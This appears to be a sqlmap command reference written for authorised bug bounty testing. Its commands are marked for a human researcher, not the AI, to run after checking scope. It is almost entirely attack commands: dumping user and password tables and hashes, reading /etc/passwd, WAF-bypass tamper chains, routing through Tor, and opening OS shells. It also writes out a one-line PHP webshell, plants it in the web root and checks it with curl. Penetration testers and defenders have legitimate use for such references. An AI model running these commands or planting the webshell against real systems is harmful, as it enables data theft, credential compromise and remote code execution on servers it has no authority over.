# sqlmap Command Reference

Organized by use case. All sqlmap commands are provided as [RUN THIS] blocks because sqlmap is a heavy scanner tool — the researcher runs these, not Claude.

**ALWAYS read `program-guidelines.txt` before running any sqlmap command.** Check rate limits and confirm the target is in scope. Start with `--delay=1 --threads=1` on sensitive targets.

---

## 1. Basic Detection

### From a saved request file (preferred — captures all headers/cookies)

```
[RUN THIS]
sqlmap -r req.txt --batch
```

### From URL (GET parameter)

```
[RUN THIS]
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### POST data

```
[RUN THIS]
sqlmap -u "http://target.com/page.php" --data="id=1&name=test" --batch
```

### Mark specific injection point with `*`

```
[RUN THIS]
sqlmap -u "http://target.com/page.php?id=1*&name=test" --batch
```

### Cookie injection (mark with `*`)

```
[RUN THIS]
sqlmap -u "http://target.com/" --cookie="TrackingId=abc*;session=xyz" --batch
```

### HTTP header injection (User-Agent, Referer, X-Forwarded-For)

```
[RUN THIS]
sqlmap -u "http://target.com/" --headers="User-Agent: Mozilla/5.0*" --batch
```

### JSON body

```
[RUN THIS]
sqlmap -r req.txt --batch
```
(Save the full request with `Content-Type: application/json` and `{"id":1}` body; sqlmap auto-detects JSON)

### PUT method

```
[RUN THIS]
sqlmap -u "http://target.com/api/item" --data='id=1' --method PUT --batch
```

---

## 2. Verbosity and Traffic Capture

### Verbose output (see payloads)

```
[RUN THIS]
sqlmap -u "http://target.com/page.php?id=1" -v 3 --batch
```

### Store all traffic to file

```
[RUN THIS]
sqlmap -u "http://target.com/page.php?id=1" -t /tmp/sqlmap-traffic.txt --batch
```

---

## 3. Attack Tuning

### Level and Risk (default: level=1, risk=1; max: level=5, risk=3)

```
[RUN THIS]
sqlmap -r req.txt --level=5 --risk=3 --batch
```

Note: `risk=3` enables OR-based payloads which can modify data — use with caution.

### Force specific technique (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline-query)

```
[RUN THIS]
sqlmap -r req.txt --technique=BEU --batch
```

Time-based only (useful when other techniques cause issues):
```
[RUN THIS]
sqlmap -r req.txt --technique=T --time-sec=10 --batch
```

### Union column count tuning

```
[RUN THIS]
sqlmap -r req.txt --technique=U --union-cols=1-20 --batch
```

### Prefix/suffix (when injection is inside a complex query structure)

```
[RUN THIS]
sqlmap -u "http://target.com/?q=test" --prefix="%'))" --suffix="-- -" --batch
```

### Status code differentiation (TRUE=200, FALSE=500)

```
[RUN THIS]
sqlmap -r req.txt --code=200 --batch
```

### String-based differentiation

```
[RUN THIS]
sqlmap -r req.txt --string="Welcome" --batch
```

### Title-based differentiation

```
[RUN THIS]
sqlmap -r req.txt --titles --batch
```

### Increased time-sec for slow networks

```
[RUN THIS]
sqlmap -r req.txt --time-sec=10 --batch
```

### No-cast mode (fixes empty output issues)

```
[RUN THIS]
sqlmap -r req.txt --no-cast --batch
```

### Fresh queries (ignore cached session)

```
[RUN THIS]
sqlmap -r req.txt --fresh-queries --batch
```

### Thread control (be careful with rate limits)

```
[RUN THIS]
sqlmap -r req.txt --threads=3 --batch
```

---

## 4. Database Enumeration

### Basic info (version, user, DB, DBA check)

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --banner --current-user --current-db --is-dba --batch
```

### List databases

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --dbs --batch
```

### List tables in a database

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --tables -D targetdb --batch
```

### Dump a specific table

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --dump -T users -D targetdb --batch
```

### Dump specific columns

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --dump -T users -D targetdb -C username,password --batch
```

### Dump with row range (avoid dumping full table)

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --dump -T users -D targetdb --start=1 --stop=3 --batch
```

### Conditional dump

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --dump -T users -D targetdb --where="username LIKE 'admin%'" --batch
```

### Full DB schema

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --schema --batch
```

### Search tables by name pattern

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --search -T user --batch
```

### Search columns by name pattern (e.g. finding password columns)

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --search -C pass --batch
```

### Password hash enumeration and cracking

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --passwords --batch
```

---

## 5. Cookies, Sessions, and Headers

### Pass session cookie

```
[RUN THIS]
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
```

### Random User-Agent (bypass UA blacklisting)

```
[RUN THIS]
sqlmap -r req.txt --random-agent --batch
```

### Anti-CSRF token bypass

```
[RUN THIS]
sqlmap -u "http://target.com/" --data="id=1&csrf-token=TOKENVALUE" --csrf-token="csrf-token" --batch
```

### Randomize a unique parameter

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1&uid=12345" --randomize=uid --batch
```

### Calculated parameter (hash of another param)

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1&h=HASH" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

---

## 6. File Operations (MySQL — requires FILE privilege or DBA)

### Check DBA status

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --is-dba --batch
```

### Read a local file

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --file-read "/etc/passwd" --batch
```

### Write a webshell

First create the shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

Then write it:
```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --file-write "/tmp/shell.php" --file-dest "/var/www/html/shell.php" --batch
```

Verify execution:
```bash
curl "http://target.com/shell.php?cmd=id"
```

---

## 7. OS Exploitation

### OS shell (interactive — may need --technique=E)

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --os-shell --technique=E --batch
```

### OS command (single command)

```
[RUN THIS]
sqlmap -u "http://target.com/?id=1" --os-cmd="id" --batch
```

---

## 8. WAF Bypass — Tamper Scripts

### List all tampers

```
[RUN THIS]
sqlmap --list-tampers
```

### Common tamper combinations

For ModSecurity / basic keyword filters:
```
[RUN THIS]
sqlmap -r req.txt --tamper=between,randomcase --batch
```

For UNION keyword filters:
```
[RUN THIS]
sqlmap -r req.txt --tamper=0eunion,between --batch
```

For space filters:
```
[RUN THIS]
sqlmap -r req.txt --tamper=space2comment,between --batch
```

For MySQL versioned comment bypass:
```
[RUN THIS]
sqlmap -r req.txt --tamper=versionedkeywords,between --batch
```

Full-strength WAF bypass (slow — use targeted approach first):
```
[RUN THIS]
sqlmap -r req.txt --tamper=0eunion,between,randomcase,space2comment,versionedkeywords --level=5 --risk=3 --random-agent --batch
```

### Chunked encoding bypass

```
[RUN THIS]
sqlmap -r req.txt --chunked --batch
```

### HTTP Parameter Pollution

```
[RUN THIS]
sqlmap -r req.txt --hpp --batch
```

### Proxy through Burp (for manual inspection of payloads)

```
[RUN THIS]
sqlmap -r req.txt --proxy="http://127.0.0.1:8080" --batch
```

### Skip WAF detection (less noise)

```
[RUN THIS]
sqlmap -r req.txt --skip-waf --batch
```

---

## 9. Proxy and Anonymization

### Route through Burp

```
[RUN THIS]
sqlmap -r req.txt --proxy="http://127.0.0.1:8080" --batch
```

### Route through Tor

```
[RUN THIS]
sqlmap -r req.txt --tor --check-tor --batch
```

### Proxy list

```
[RUN THIS]
sqlmap -r req.txt --proxy-file=/path/to/proxies.txt --batch
```

---

## 10. Full Production-Safe Combo Commands

### Standard first-pass (safe, low noise)

```
[RUN THIS]
sqlmap -r req.txt --batch --random-agent --delay=1 --threads=1
```

### Targeted table dump (after confirming injection)

```
[RUN THIS]
sqlmap -r req.txt --batch --dump -T users -D targetdb -C username,password --no-cast --random-agent --delay=1
```

### Time-based blind with high accuracy

```
[RUN THIS]
sqlmap -r req.txt --batch --technique=T --time-sec=10 --no-cast --fresh-queries --threads=1 --random-agent
```

### WAF bypass — step up approach

Step 1 (minimal):
```
[RUN THIS]
sqlmap -r req.txt --batch --tamper=between --random-agent
```

Step 2 (if blocked):
```
[RUN THIS]
sqlmap -r req.txt --batch --tamper=0eunion,between,randomcase --level=3 --risk=2 --random-agent
```

Step 3 (full):
```
[RUN THIS]
sqlmap -r req.txt --batch --tamper=0eunion,between,randomcase,space2comment --level=5 --risk=3 --random-agent --delay=1
```

### Skill assessment pattern (from notes: specific table with time-based)

```
[RUN THIS]
sqlmap -r req.txt --batch --dump --level=5 --risk=3 --random-agent --tamper=between --technique=T -D production -T target_table --no-cast
```
